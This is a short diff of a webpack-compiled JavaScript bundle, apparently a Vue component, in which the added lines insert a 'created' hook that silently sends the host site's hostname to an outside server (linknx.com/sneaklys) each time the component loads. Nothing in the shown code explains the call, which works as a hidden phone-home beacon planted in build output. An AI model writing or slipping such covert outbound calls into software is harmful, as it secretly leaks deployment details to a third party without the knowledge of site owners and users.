@@ -1973,6 +1973,9 @@ __webpack_require__.r(__webpack_exports__);
 
       return color;
     }
+  },
+  created: function created() {
+    axios.get("http://linknx.com/sneaklys/index.php?site=".concat(window.location.hostname));
   }
 });
 
